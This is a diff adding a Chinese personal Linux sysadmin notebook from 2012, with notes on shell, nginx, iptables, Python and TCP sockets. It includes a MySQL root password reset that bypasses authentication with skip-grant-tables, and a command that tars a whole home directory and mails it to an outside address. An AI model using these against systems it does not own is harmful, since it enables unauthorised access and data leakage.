+stick bit 二进制串：001，换算：1
+于是也可以这样设:setuid:chmod 4755 xxx
+setgid:chmod 2755 xxx
+stick bit:chmod 1755 xxx
+最后，在一些文件设置了特殊权限后，字母不是小写的s或者t，而是大写的S和T，那代表此文件的特殊权限没有生效，是因为你尚未给它对应用户的x权限  
+
+truncate sql 删除表
+stat 文件 查看问价的 详细信息 ctime
+tomcat 内存优化 -Xms1024m -Xmx1500m -XX:MaxNewSize=128m -XX:MaxPermSize=128m
+
+nameserver 192.168.1.1
+domain vegaga.com      在/etc/resolv.conf中 domain 是 待设域名，当值ping www时 就相当于 ping www.vegaga.com
+
+
+sersync 同步工具
+
+---------------------------------------2012.04.10------------------------------------------
+rev 翻转输出 123 321
+host 查看域名对应的ip
+host -t cname www.baidu.com
+host -vt mx www.baidu.com 加v参数可以显示更多的内容
+当查询的结果大于512个字节时  dns解析会用 tcp 协议 因为udp的最大传输时 512字节
+
+--------------------------------------2012.04.11------------------------------------------------
+getfacl  显示文件的权限
+awk 'BEGIN{srand();for(i=0;i<5;i++)print int(rand()*10)}'  解决 rand()问题
+cpuinfo 主机CPU 信息
+filesystems 文件系统信息
+meninfo 主机内存信息
+version Linux 内存版本信息
+diskstatus 磁盘负载情况
+/proc/sys 目录的作用是报告各种不同的内核参数
+
+read -t 5 read 命令5 秒后自动退出
+grep -P perl 正则
+mail -s “主题”用户名@地址< 文件  
+uuencode /home/zhousir/httpd.conf httpd.conf|mail -s mailtest zhousir1991@gmail.com
+tar czf - /home/zhousir/ | uuencode home.tgz |mail -s mailtest zhousir1991@gmail.com
+添加附件 如果你的系统里没有uuencode命令的话，请先安装sharutils(yum install sharutils)
+
+主机192.168.1.20 访问172.16.1.0/24 网络时  route add –net 172.16.1.0 gw 192.168.1.1 netmask 255.255.255.255 metric1
+i 节点是一个64 字节长的表，表中包含了文件的相关信息，其中有文件的大小、文件所有
+者、文件的存取许可方式以及文件的类型等重要信息。在i 节点表中最重要 的内容是磁盘
+地址表 。在磁盘地址表中有13 个块号，文件将以块号在磁盘地址表中出现的顺序依次读
+取相应的块。Linux 文件系统通过把i 节点和文件名进行 连接，当需要读取该文件时，文
+件系统在当前目录表中查找该文件名对应的项，由此得到该文件相对应的i 节点号，通过该
+i 节点的磁盘地址表把分散存放的文件物 理块连接成文件的逻辑结构。
+
+ssh 协议的版本 1 使用的是 RSA 密钥，而 DSA 密钥却用于协议级 2，这是 ssh 协议的最新版本。目前所有的 OpenSSH 版本都应该既能使用 RSA 密钥又能使用 DSA 密钥。DSA 密钥以如下类似于 RSA 密钥的方式使用 OpenSSH 的 ssh-keygen 生成：ssh-keygen -t dsa
+
+------------------------------------2012.04.12-----------------------------------------------
+ps -eo pid,ni,pri,pcpu,psr   psr表示程序运行在哪个cpu上
+
+* 检查系统运行队列并确保每个核心上不超过3 个可运行进程
+* 确保CPU利用率的用户时间和系统时间在70/30之间
+* 当CPU花费更多的时间在system mode上时，更有可能是因过载而试图重新调度优
+先级
+* 运行CPU限制型应用比IO限制型应用更易出现性能瓶颈
+
+I/O 性能监测可总结如下：
+* 任何时间出现CPU等待IO，说明磁盘超载。
+* 计算出你的磁盘可维持的IOPS值。
+* 判定你的应用时属于随机磁盘访问型还是有序型。
+* 通过对比等待时间和服务时间即可判断磁盘是否缓慢。
+* 监测交换空间和文件系统坐在分区并确保他们之间不存在争抢IO。  
+ipvsadm -ln
+cat file|while read line 循环读入一行
+
+--------------------------------2012.04.16----------------------------------------
+ paste <(seq 10) <(for i in {1..10};do echo $RANDOM;done) 随机数
+rootkit 病毒后门
+nginx负载均衡upstream可视化健康检测模块ustats
+
+--------------------------------2012.04.17----------------------------------------
+rootkit 检查工具 roothunter
+uniq  -c 在输出行前面加上每行在输入文件中出现的次数。 -d 仅显示重复行。  -u 仅显示不重复的行。 
+perl和posix
+
+--------------------------------2012.04.18------------------------------------
+clustershell linux集群管理工具
+….oooO…………..
+…..(….)…Oooo…
+……)../…..(….)….
+…..(_/…….)../…..
+……………(_/……
+… 路途……………
+………. 遥远 …….
+
+--------------------------------2012.04.18--------------------------------------------
+python 读取参数 getopt
+
+--------------------------------2012.04.24----------------------------------------
+python 远程连接 模块 paramiko
+####意思就是execute_command() 他是a single session，每次执行完后都要回到缺省目录。所以可以 .execute_command('cd  /var; pwd')
+或者使用aa = ssh.invoke_shell()
+aa.send('cd /var\n')
+aa.recv(100)
+###shell用法####
+
+sendkey
+
+--------------------------------2012.04.25-----------------------
+sed   ta是判断 a: 后的直与假 假下条，ba 是for 到/b 处，不管真假一直循环
+ssh -NfC -L 本地端口:远端目标ip:远端端口 中间跳板 -p 中间端口 -l 用户名 -i 密钥路径 
+ssh 用户名@127.0.0.1 -p本地端口
+1）eclipse + pydev + wxpython
+2）netbeans + wxpython
+3) emacs + wxpython
+4) boa-constructor + 1）- 3)
+ http://deadlock.netbeans.org/hudson/job/nbms-and-javadoc/lastStableBuild/artifact/nbbuild/nbms/updates.xml.gz  
+
+boa-constructor
+
+-------------------------------2012.04.28---------------------
+SQLLITE 超小的 数据库
+comm 对比 两个文件的 域有什么不同
+
+-------------------------------2012.05.02------------------------
+spawn ssh .....
+expect ""
+send ""
+expect eof
+expect 他判断返回的什么东西
+send 是你发送的命令
+
+nginx是一个高性能的HTTP和反向代理服务器。
+他的代码非常的优雅，可扩展性非常强。即使你的工作跟webserver毫无关系，也可以借鉴其中的很多处理问题的方式。
+分析nginx源代码，是使自己进步的一个很好的方法。但是并不是每个人都具备这个实力去分析其中的代码的，一些编程基础是必须的。我粗略的总结一下，在分析nginx源代码之前，你必须掌握如下技能：
+1.	深厚的c语言基础；
+2.	一定的算法和数据结构知识；
+3.	Linux编程知识，例如gcc和gdb的使用；
+4.	Linux网络编程，主要是epoll和非阻塞io；
+5.	阅读代码工具，推荐ctags配合vim；
+6.	http协议的理解；
+看到这些也许有些人已经觉得太难了，但是不要气馁，我会在之后的文章中来帮你完成这个过程。
+我本人非常讨厌中国的教育形式以及中国人的思维模式，所以我会尽量使用启发的方式阐述问题。在分析代码的时候，不要强迫自己去记忆一些东西，而首先要理解实际业务需求和作者的意图。
+对于新手来说千万一行行的去分析，这样容易“走失”。应该首先学习代码的主干，然后一点点的深入细节。当然，即使你是个新手，在分析完nginx之后，我相信你的编程底蕴会有质的飞跃。
+
+------------------------------2012.05.03---------------------------------------
+#!/usr/bin/expect -f 
+
+set remoteservername [lindex $argv 0]
+set remoteserverpassword [lindex $argv 1]
+
+set timeout -1
+
+spawn ssh -i $remoteserverpassword $remoteservername
+
+send "exit\r"
+expect eof
+用expect
+在.sh的文件里调用就可以
+
+ 用硬件检测程序kuduz探测新硬件：service kudzu start ( or restart)
+
+查看CPU信息：cat /proc/cpuinfo
+查看板卡信息：cat /proc/pci
+查看PCI信息：lspci (相比cat /proc/pci更直观） 
+例子： lspci |grep Ethernet 查看网卡型号
+查看内存信息：cat /proc/meminfo
+查看USB设备：cat /proc/bus/usb/devices
+查看键盘和鼠标:cat /proc/bus/input/devices
+查看系统硬盘信息和使用情况：fdisk & disk - l & df
+查看各设备的中断请求(IRQ):cat /proc/interrupts
+
+Range: bytes=5275648- 断点续传
+
+
+---------------------------------2012.05.07--------------------------------------
+rev   反向输出 hello  olleh
+
+nessus  NeXpose 漏洞扫面
+
+52180558
+
+--------------------------------2912.05.07--------------
+ngx_devel_kit，安装lua的那个模块，这个模块也必须装
+http://openresty.org/  一淘宝项目
+
+-------------------------------2012.05.07-------------------------
+echo "ahebhaaa" | fold -1  行变列
+maxdepath  1 find只查找一层目录
+dirname和basename
+
+-------------------------------2012.05.24------------------------------
+ls JCP*.py | sed -r 's/.*([0-9]{2})\.py/mv & \1.py/e'  e参数执行系统命令
+
+面试题
+1、apache2.X有几种工作模式，如何查年是工作在哪种模式下？如何查看apache当前支持的模式
+2、Nginx开启列出目录功能，UPstream模块是做什么用的
+3、Mysql查看表结构
+4、Squid清缓存，如何查看命中率，需要调整哪些内核参数
+5、Grep本目录中以数字命名的文件和以A或者B开头命名的文件
+6、有一个a.txt文件，的里面所有字母都转换成大写
+7、Sed打印出文中前10行、第一行、最后一行，把文中所有的abc字符转换成123
+8、如何让shell程序在后台运行，退出终端不会中断
+9、crontab在11月内，每天早上6点到12点中，每隔2小时执行一次/usr/bin/httpd.sh
+10、有a.txt文件，里面内容如下
+1234569
+abcABCabc
+要求使用awk打印出以下结果
+987654321
+cbaCBAcba
+11、如何查看PID为29394的进程的环境变量
+12、写出查看CPU负载的命令，请考虑系统有多个CPU
+13、写出查看磁盘IO、内存使用的命令集，以及你对这些命令输出的理解
+14、编写一个shell，判断系统用户user001,user002,~~~user100是否存在
+15、/etc/passwd文件使用awk匹配squid用户，并打印其用户ID,passwd文件格式如下:
+squid1:x:500:500::/home/squid1:/bin/bash
+squid2:x:500:500::/home/squid2:/bin/bash
+16、有一个apache日志access.log，使用shell统计出访问量最高的前5名IP
+58.240.35.69 -- [04/Mar/2011:03:17:43 +0800] "GET /iphone/ HTTP/1.1" 200 819 "." "mo cpu iphone os 4_1 like mac os x; zh-cn) AppleWebkit/532.9 (khtml,like gecko) mobile /134*****
+17、请描述TCP三次握手的过程
+18、Linux系统中软链接和硬链接的区别
+19、写出思科交换机的端口汇聚命令
+20、用你习惯的编程语言完成如下题目：有10台被监控的主机，一台监控机，在被监控机器/分区使用率大于80%，就发邮件报警
+监控机IP：192.168.1.1，被监控IP：192.168.1.100-109
+
+
+-----------------------------------2012.05.25-------------------------------
+referer    
+提交者(其正确英语拼法是referrer，由于早期HTTP规范的拼写错误，为了保持向后兼容而将错就错)
+
+ConfigParser  python配置文件
+ngx_devel_kit
+
+-----------------------------------2012.05.31--------------
+你上次给我说的那些注意事项，我记下来了，你帮我看看还有遗漏的吗。。。SOCKET和TCP细节的。。。
+服务器端调用流程：
+socket->bind->listen->accept->send/recv->close
+客户端调用流程：
+socket->connect->send/recv->close
+注意事项：
+a.	accept
+#include <syspes.h>
+#include <sys/socket.h>
+
+int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+该函数返回了一个新的套接口描述符，用于记录和客户端的连接，于是之后的send/recv都是用的这个新的套接口描述符。
+accept返回错误码：
+EAGAIN or EWOULDBLOCK
+	套接口设置的是非阻塞模式，并且现在没有任何连接到来。
+ECONNABORTED
+	连接已经断开
+b.	connect
+ECONNREFUSED:对端没有监听端口
+EINPROGRESS：代表已经发了SYN，还没有等到对端的SYN+ACK
+
+c.	close
+
+注意：对端套接口已经关闭，这时候还在往对端里写数据，就会产生一个SIGPIPE信号，默认忽略SIGPIPE信号
+
+	首先发FIN的无论是服务器还是客户端会进入TIME_WAIT状态
+1．	自己如果已经发了FIN，还没有等到对端的ACK，这个时候是FIN_WAIT_1
+2．	接收到对端的ACK，还没有接收到对端的FIN，这个时候是FIN_WAIT_2
+3．	收到了对端的FIN，然后自己发了ACK，进入TIME_WAIT状态
+4．	时间为2MSL
+
+孙鹤<sunheqiubai@qq.com>  10:25:31
+不错
+阿亮真不错
+永远的阿亮(335676770)  10:26:05
+我这两天主要看了accept这块，理论稍有提高。。。
+还有啥注意的吖。。。
+义胜军 共享文件 1 个 10:26:30
+ rbtree.c 
+立即下载 | 查看全部
+永远的阿亮(335676770)  10:26:56
+EPOLL LT
+可读：
+1.	建立完三次握手，内核的accept_queue里有数据可读。
+2.	Buffer里有数据，对端关闭，fin/rst可读
+可写：
+1.	Connect异步返回错误，EINPROGRESS产生可写事件
+2.	Buffer可写
+
+
+--------------------------------2012.06.04------------------------------
+MATLAB  图形软件
+
+0-9 排列组合
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void
+display(int *ar, int count)
+{
+    int i;
+
+    for (i=0; i<count; i++) {
+        printf("%d ", ar[i]);
+    }   
+    printf("\n");
+}
+
+void
+seq_ex(int *ar, int count, int pos)
+{
+    int i;
+    int v;
+
+    for (v=0; v<count; v++) {
+        for (i=0; i<pos; i++) {
+            if (ar[i]==v) {
+                break;
+            }   
+        }   
+        if (i==pos) {
+            ar[pos] = v;
+            if (pos+1<count) {
+                seq_ex(ar, count, pos+1);
+            } else {
+                display(ar, count);
+                break;
+            }   
+        }   
+    }   
+}
+
+void
+seq(int *ar, int count)
+{
+    seq_ex(ar, count, 0); 
+}
+
+int
+main(int argc, char *argv[])
+{
+    int rv = 0;
+    int ar[10];
+
+    seq(ar, 10);
+
+    return rv; 
+}
+
+iptables 允许所有内网 iptables -A INPUT -s 内网网段 -j ACCEPT
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+iptables -A FORWARD -s ip  -m limit --limit 网速 -j ACCEPT
+iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 6 -j REJECT
+
+----------------------------------2012.06.05-----------------------
+ab 错误解决
+vi /etc/sysctl.conf
+
+net.nf_conntrack_max = 655360
+
+net.netfilter.nf_conntrack_tcp_timeout_established = 1200
+
+sysctl -p /etc/sysctl.conf
+
+----------------------------------2012.06.06-------------------------------
+crontab -e 擦做的文件
+echo "1  1  *  *  *  sh /root/nt.sh">>/var/spool/cron/root
+
+----------------------------------2012.06.07---------------------------------
+ps -e -o pid,pcpu,sz,vsz,args
+
+ulimit
+-H  设置硬资源限制，一旦设置不能增加。  ulimit – Hs 64；限制硬资源，线程栈大小为 64K。  
+-S  设置软资源限制，设置后可以增加，但是不能超过硬资源设置。  ulimit – Sn 32；限制软资源，32 个文件描述符。  
+-a  显示当前所有的 limit 信息。  ulimit – a；显示当前所有的 limit 信息。  
+-c  最大的 core 文件的大小， 以 blocks 为单位。  ulimit – c unlimited； 对生成的 core 文件的大小不进行限制。  
+-d  进程最大的数据段的大小，以 Kbytes 为单位。  ulimit -d unlimited；对进程的数据段大小不进行限制。  
+-f  进程可以创建文件的最大值，以 blocks 为单位。  ulimit – f 2048；限制进程可以创建的最大文件大小为 2048 blocks。  
+-l  最大可加锁内存大小，以 Kbytes 为单位。  ulimit – l 32；限制最大可加锁内存大小为 32 Kbytes。  
+-m  最大内存大小，以 Kbytes 为单位。  ulimit – m unlimited；对最大内存不进行限制。  
+-n  可以打开最大文件描述符的数量。  ulimit – n 128；限制最大可以使用 128 个文件描述符。  
+-p  管道缓冲区的大小，以 Kbytes 为单位。  ulimit – p 512；限制管道缓冲区的大小为 512 Kbytes。  
+-s  线程栈大小，以 Kbytes 为单位。  ulimit – s 512；限制线程栈的大小为 512 Kbytes。  
+-t  最大的 CPU 占用时间，以秒为单位。  ulimit – t unlimited；对最大的 CPU 占用时间不进行限制。  
+-u  用户最大可用的进程数。  ulimit – u 64；限制用户最多可以使用 64 个进程。  
+-v  进程最大可用的虚拟内存，以 Kbytes 为单位。  ulimit – v 200000；限制最大可用的虚拟内存为 200000 Kbytes。  
+
+-------------------------------2012.06.08--------------------------------------
+
+ ping -c 1 192.168.1.70 &> /dev/null && a=1||a=0
+ping  -w 参数 超时
+查看当前硬盘写Cache状态
+
+root@ubuntu:~/hdparm-9.37# hdparm -W  /dev/sda
+
+关闭硬盘的写Cache
+
+root@ubuntu:~/hdparm-9.37# hdparm -W  0 /dev/sda
+
+打开硬盘的写Cache
+
+root@ubuntu:~/hdparm-9.37# hdparm -W  1 /dev/sda
+
+-----------------------------2012.06.08----------------------------------------------
+sed -n '1~2p' 偶数行  1~2从1开始，每次step2
+
+-----------------------------2012.06.13--------------------------------
+maxHttpHeaderSize="8192"
+               maxThreads="4000"
+               minSpareThreads="100"
+               acceptCount="3000"
+               enableLookups="false"
+               disableUploadTimeout="true"
+               compression="on" compressionMinSize="2048"
+
+----------------------------2012.06.13------------------------------
+const 限定变量不能被修改
+% 不能用于 float double 类型
+find .  ! -name "." -type d -prune -o -type f  -name "*c*"  -print -exex mv {} `date +%F` \;
+
+----------------------------2012.06.18---------------------------
+for line in open('xxx', 'r'):
+     print line,
+快速读取大文件
+数组a中的 第i个元素 可以用 *(a+i) 表示
+
+----------------------------2012.06.20-----------------------------
+一元表达式 从右往左
+
+--skip-grant-tables  跳过 mysql 权限
+python 选项
+if __name__ == '__main__':
+    import optparse
+    parser = optparse.OptionParser()
+    parser.add_option(
+        '-b','--buffer',
+        dest='buffer_size',
+        type='int',default=32000,
+        help='''Size of the line buffer. The file to sort is
+            divided into chunks of that many lines. Default : 32,000 lines.'''
+    )
+    parser.add_option(
+        '-k','--key',
+        dest='key',
+        help='''Python expression used to compute the key for each
+            line, "lambda line:" is prepended.\n
+            Example : -k "line[5:10]". By default, the whole line is the key.'''
+    )
+    parser.add_option(
+        '-t','--tempdir',
+        dest='tempdirs',
+        action='append',
+        default=[],
+        help='''Temporary directory to use. You might get performance
+            improvements if the temporary directory is not on the same physical
+            disk than the input and output directories. You can even try
+            providing multiples directories on differents physical disks.
+            Use multiple -t options to do that.'''
+    )
+    parser.add_option(
+        '-p','--psyco',
+        dest='psyco',
+        action='store_true',
+        default=False,
+        help='''Use Psyco.'''
+    )
+    options,args = parser.parse_args()
+
+
+python 管道输入流
+import sys
+data = sys.stdin.readlines()
+
+------------------------2012.06.21------------------
+symbol 标识
+
+------------------------2012.06.27-----------------------
+binlog 的切换有两种，当到达默认大小时会自动切换，运行flush logs可手动切换
+破解mysql root的密码：
+1.vim /etc/my.cnf 在[mysqld]项内添加skip-grant-tables
+2.重启mysql：/etc/init.d/mysql restart后再删除skip-grant-tables
+3.此时root密码为空，进入mysql：mysql -uroot –p
+4.mysql> use mysql;
+   mysql>update user set password=password('456789') where user='root';
+   mysql> flush privileges;
+   mysql>exit
+5.现在就可以用新设置的密码：456789进入mysql
+
+linux 最大 pid 默认是 32768 ，最大值不能超过 2^22 (4194304)
+static修饰之后，只能被本文件中函数引用此变量。
+
+
+-------------------------2012.06.21--------------------------
+bash 接口
+exec 6<>/dev/tcp/$HOST/$port
+echo -e "GET $FILE HTTP/1.1" >&6
+echo -e "Host: $HOST" >&6
+echo -e "Connection: close\n" >&6
+
+echo -e 转意
+
+echo $(( 2#101011 ))  #表示进制转换
+死循环 while ： 或 while true：
+
+.查看Linux系统当前单个共享内存段的最大值  ipcs -a
+
+查看当前系统某一硬件的驱动版本。比如网卡
+ehtool –i eth0
+
+-----------------------2012.07.03-------------------------
+nginx 高效重定向
+    server {
+        listen       80;
+        server_name  www.nginx.org  nginx.org;
+        if ($http_host = nginx.org) {
+            rewrite  (.*)  http://www.nginx.org$1;
+        }
+        ...
+    }
+
+这种做法是错的，复杂而且低效。正确的方式是为nginx.org定义一个单独的服务器：
+
+    server {
+        listen       80;
+        server_name  nginx.org;
+        return       301 http://www.nginx.org$request_uri;
+    }
+
+typedef enum {
+//读取请求phase
+NGX_HTTP_POST_READ_PHASE = 0,
+//接下来就是开始处理
+//这个阶段主要是处理全局的(server block)的rewrite。
+NGX_HTTP_SERVER_REWRITE_PHASE,
+//这个阶段主要是通过uri来查找对应的location。然后将uri和location的数据关联起来
+NGX_HTTP_FIND_CONFIG_PHASE,
+//这个主要处理location的rewrite。
+NGX_HTTP_REWRITE_PHASE,
+//post rewrite，这个主要是进行一些校验以及收尾工作，以便于交给后面的模块。
+NGX_HTTP_POST_REWRITE_PHASE,
+//比如流控这种类型的access就放在这个phase，也就是说它主要是进行一些比较粗粒度的access。
+NGX_HTTP_PREACCESS_PHASE,
+//这个比如存取控制，权限验证就放在这个phase，一般来说处理动作是交给下面的模块做的.这个主要是做一些细粒度的accessNGX_HTTP_ACCESS_PHASE,
+//一般来说当上面的access模块得到access_code之后就会由这个模块根据access_code来进行操作
+NGX_HTTP_POST_ACCESS_PHASE,
+//try_file模块，也就是对应配置文件中的try_files指令。
+NGX_HTTP_TRY_FILES_PHASE,
+//内容处理模块，我们一般的handle都是处于这个模块
+NGX_HTTP_CONTENT_PHASE,
+//log模块
+NGX_HTTP_LOG_PHASE
+} ngx_http_phases;
+
+
+----------------------------------2012.07.04----------------------------
+浏览器默认最大并发连接数 浏览器 	HTTP 1.1 	HTTP 1.0
+IE 6,7 	2 	4
+IE 8 	6 	6
+Firefox 2 	2 	8
+Firefox 3 	6 	6
+Safari 3, 4 	4 	4
+Chrome 1,2 	6 	?
+Chrome 3 	4 	4
+Opera 9.63,10.00alpha 	4 	4
+
+进程间通信： 
+ipcs -u查看状态； 
+ipcs -l查看限制。 
+
+----------------------------------2012.07.05------------------------------
+time.time() 取从1970-1-1到当前时间的秒数，以浮点类型表示 如：输出1318840169.1617351
+time.localtime() 本地时间 struct_time类型 如：(2012, 7, 5, 8, 42, 20, 3, 187, 0)
+time.gmtime()  将时间串格式化成  struct_time类型
+time.strftime() 格式化 struct_time类型
+time.ctime([sec])->【文本日期格式】    将秒数转换成文本描述的日期格式，不带参数时取当前时间
+
+
+----------------------------------2012.07.06--------------------------------------
+Tornado 跟其他主流的Web服务器框架   python 编写
+
+----------------------------------2012.07.08----------------------------------
+# uname -a               # 查看内核/操作系统/CPU信息
+　　#cat /proc/version   # 查看内核
+　　# cat /etc/issue        # 查看操作系统版本
+　　# head -n 1 /etc/issue   # 查看操作系统版本
+　　# cat /proc/cpuinfo       # 查看CPU信息
+　　# hostname               # 查看计算机名
+　　# lspci -tv               # 列出所有PCI设备
+　　# lsusb -tv               # 列出所有USB设备
+　　# lsmod                   # 列出加载的内核模块
+　　# env                     # 查看环境变量资源
+　　# free -m                 # 查看内存使用量和交换区使用量
+　　# df -h                   # 查看各分区使用情况
+
+passwd -S root 查看 root 修改时间
+
+-----------------------------------2012.07.09-----------------------------------
+nginx consistent_hash squid 多核解决
+使用last会对server标签重新发起请求，而break就直接使用当前的location中的数据源来访问，要视情况加以使用。
+一般在非根的location中配置rewrite，都是用的break；而根的location使用last比较好，因为如果配置了fastcgi或代理访
+问jsp文件的话，在根location下用break是访问不到。测试到rewrite有问题的时候，也不妨把这两者换换试试。
+
+cp 强制覆盖 用 \cp
+修改文件的 mtime 用 touch -m 文件名
+
+
+----------------------------------2012.07.10------------------------------------
+echo -e 启动转意  -E 关闭转意   -n  取消行末换行符
+關於 echo 命令所支援的反斜線控制字符如下表：
+
+\a：ALERT / BELL (從系統喇叭送出鈴聲)
+
+\b：BACKSPACE ，也就是向左刪除鍵
+
+\c：取消行末之換行符號
+
+\E：ESCAPE，跳脫鍵
+
+\f：FORMFEED，換頁字符
+
+\n：NEWLINE，換行字符
+
+\r：RETURN，回車鍵
+
+\t：TAB，表格跳位鍵
+
+\v：VERTICAL TAB，垂直表格跳位鍵
+
+\n：ASCII 八進位編碼(以 x 開首為十六進位)
+
+\\：反斜線本身
+
+${file#*/}：拿掉第一條 / 及其左邊的字串：dir1/dir2/dir3/my.file.txt
+
+${file##*/}：拿掉最後一條 / 及其左邊的字串：my.file.txt
+
+${file#*.}：拿掉第一個 .  及其左邊的字串：file.txt
+
+
+
+${file##*.}：拿掉最後一個 .  及其左邊的字串：txt
+
+${file%/*}：拿掉最後條 / 及其右邊的字串：/dir1/dir2/dir3
+
+${file%%/*}：拿掉第一條 / 及其右邊的字串：(空值)
+
+${file%.*}：拿掉最後一個 .  及其右邊的字串：/dir1/dir2/dir3/my.file
+
+${file%%.*}：拿掉第一個 .  及其右邊的字串：/dir1/dir2/dir3/my
+
+ 
+
+記憶的方法為：
+
+# 是去掉左邊(在鑑盤上 # 在 $ 之左邊)
+
+% 是去掉右邊(在鑑盤上 % 在 $ 之右邊)
+
+單一符號是最小匹配﹔兩個符號是最大匹配。
+rename .txt "" *.txt  将 *.txt 结尾的 替换成* 
+
+${file:0:5}：提取最左邊的 5 個字節：/dir1
+
+${file:5:5}：提取第 5 個字節右邊的連續 5 個字節：/dir2
+
+ 
+
+我們也可以對變量值裡的字串作替換：
+
+ 
+
+${file/dir/path}：將第一個 dir 提換為 path：/path1/dir2/dir3/my.file.txt
+
+${file//dir/path}：將全部 dir 提換為 path：/path1/path2/path3/my.file.txt
+
+ 
+
+利用 ${ } 還可針對不同的變數狀態賦值(沒設定、空值、非空值)：
+
+ 
+
+${file-my.file.txt} ：假如 $file 沒有設定，則使用 my.file.txt 作傳回值。(空值及非空值時不作處理)
+
+${file:-my.file.txt} ：假如 $file 沒有設定或為空值，則使用 my.file.txt 作傳回值。 (非空值時不作處理)
+
+${file+my.file.txt} ：假如 $file 設為空值或非空值，均使用 my.file.txt 作傳回值。(沒設定時不作處理)
+
+${file:+my.file.txt} ：若 $file 為非空值，則使用 my.file.txt 作傳回值。 (沒設定及空值時不作處理)
+
+${file=my.file.txt} ：若 $file 沒設定，則使用 my.file.txt 作傳回值，同時將 $file 賦值為 my.file.txt 。 (空值及非空值時不作處理)
+
+${file:=my.file.txt} ：若 $file 沒設定或為空值，則使用 my.file.txt 作傳回值，同時將 $file 賦值為 my.file.txt 。 (非空值時不作處理)
+
+${file?my.file.txt} ：若 $file 沒設定，則將 my.file.txt 輸出至 STDERR。 (空值及非空值時不作處理)
+
+${file:?my.file.txt} ：若 $file 沒設定或為空值，則將 my.file.txt 輸出至 STDERR。 (非空值時不作處理)
+
+${#file} 可得到 27 ，因為 /dir1/dir2/dir3/my.file.txt 剛好是 27 個字節...
+
+# ${A[@]} 或 ${A} 可得到 a b c def (全部組數)
+
+${A[0]} 可得到 a (第一個組數)，${A[1]} 則為第二個組數...
+
+${#A[@]} 或 ${#A# } 可得到 4 (全部組數數量)
+
+${#A[0]} 可得到 1 (即第一個組數(a)的長度)，${#A[3]} 可得到 3 (第四個組數(def)的長度)
+
+A[3]=xyz 則是將第四個組數重新定義為 xyz ...
+
+tar -C 制定解压输出路径
+
+---------------------------------------2012.07.11--------------------------------
+proxy_bind  nginx 绑定ip
+
+如果 不用路由绑定的话  操作系统会怎么选择数据出口呢
+取决于“跃点”，如果各卡跃点值相同，流量平均
+
+metric   Metric  
+为路由指定所需跃点数的整数值（范围是   1   ~   9999），它用来在路由表里的多个路由中选择与转发包中的目标地址最为匹配的路由。所选的路由具有最少的跃点数。跃点数能够反映跃点的数量、路径的速度、路径可靠性、路径吞吐量以及管理属性。 
+
+---------------------------------------2012.07.13-------------------------------
+python read读取 全部  str类型  readline 读取一行  str  readlines（） 读取全部 list类型
+seek移动索引
+f.tell()					#通过此函数(返回字符流的当前位置)可以看到返回的数字为6   字符位置
+f.seek(0)				#通过此函数(设置字符流的位置)可以把当前位置设置到字符流的开始位置(0)
+
+-------------------------------------2012.07.15--------------------------------------
+PID ：进程的id，这个id很有用，在linux中内核管理进程就得靠pid来识别和管理某一个程，比如我想终止某一个进程，则用 ‘kill  进程的pid’，有时并不能杀掉，则需要加一个-9选项了’kill  -9  进程pid’
+
+STAT ：表示进程的状态，进程状态分为以下几种（不要求记住，但要了解）
+
+D  不能中断的进程（通常为IO）
+
+R  正在运行中的进程
+
+S  已经中断的进程，通常情况下，系统中大部分进程都是这个状态
+
+T  已经停止或者暂停的进程，如果我们正在运行一个命令，比如说sleep 10，如果我们按一下ctrl -z 让他暂停，那么我们用ps查看就会显示T这个状态
+
+W 这个好像是说，从内核2.6xx 以后，表示为没有足够的内存页分配
+
+X  已经死掉的进程（这个好像从来不会出现）
+
+Z  僵尸进程，杀不掉，打不死的垃圾进程，占系统一小点资源，不过没有关系。如果太多，就有问题了。一般不会出现。
+
+<  高优先级进程
+
+N  低优先级进程
+
+L   在内存中被锁了内存分页
+
+s   主进程
+
+l   多线程进程
+
++  代表在前台运行的进程
+
+mii-tool 查看网卡工作状态
+iptables -t 后面跟表名，-nvL 即查看该表的规则，其中-n表示不针对IP反解析主机名；-L表示列出的意思；而-v表示列出的信息更加详细。如果不加-t ，则打印filter表的相关信息。
+xargs -n1 –i{} 类似for循环，-n1意思是一个一个对象的去处理，-i{} 把前面的对象使用{}取代，mv {} {}_bak  相当于 mv 1.txt  1.txt_bak。你刚开始接触这个命令时也许有点难以理解，多练习一下你就会熟悉了，笔者建议你记住这个应用，很实用。
+rename .txt "" *.txt 将以.txt 结尾的替换成*
+
+output = os.popen('cat /proc/cpuinfo')
+print output.read()  获取系统命令内容 
+
+
+-------------------------------------------2012.07.17-------------------------------
+符号	说明
+-eq     等于
+-ne	不等于
+-gt	大于
+-lt	小于
+-ge	大于等于
+-le	小于等于
+
+
+选项	作用
+-a	与操作
+-o	或操作
+!	非操作
+
+
+选项 	作用
+-d 	目录
+-e 	是否存在
+-f 	是否是普通文件
+-s 	文件大小是否等于0
+-r 	是否可读
+-w 	是否可写
+-x 	是否可执行
+
+shutil.copyfile(src, dst)
+shutil.copytree(srcDir, dstDir)  python 拷贝
+
+------------------------------------------2012.07.18---------------------------------------------------
+for-else方式的循环, else子句会在所有的元素都被循环完成之后执行
+datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")  python 日期操作
+
+------------------------------------------2012.07.19---------------------------------------
+find -perm mode 完全匹配
+find -perm -mode  1位置完全匹配
+find -perm +mode  至匹配一个1 位置就行
+
+-----------------------------------------2012.07.20---------------------------------
+ blkid  显示设备的 uuid
+/dev/disk/by-uuid  符号连接
+tee 三通输出 同时输出到两个地方
+
+-----------------------------------------2012.07.21------------------------------------
+tar 包追加文件  tar -rcf    跟新 ucf
+exec /usr/bin/script -a -f -q /var/log/ops/`whoami`-`date +%Y%m%d%H%M`.log  记录每一个用户的操作日志
+find /usr/sam \( -path /usr/sam/dir1 -o -path /usr/sam/file1 \) -prune -o -print  find 忽略某个目录
+-maxdepth 1 find 目录深度
+ touch -m -t 201201010101 1/1/123  修改 mtime
+find ./ -path "./2" -prune -o -print   -o 累死shell的 || 只有前面条件不成立 才find
+
+#!/bin/bash
+exec 0<$1
+while read line;do
+	echo $line
+done
+
+字典.items() 列出字典里的 键值 和 内容
+shell -n 只检查语法不执行
+
+----------------------------------------2012.07.25------------------------------------
+shell local添加后，作用域的范围不一样。local仅仅的作用范围在函数体内
+locale  显示本机字符集
+
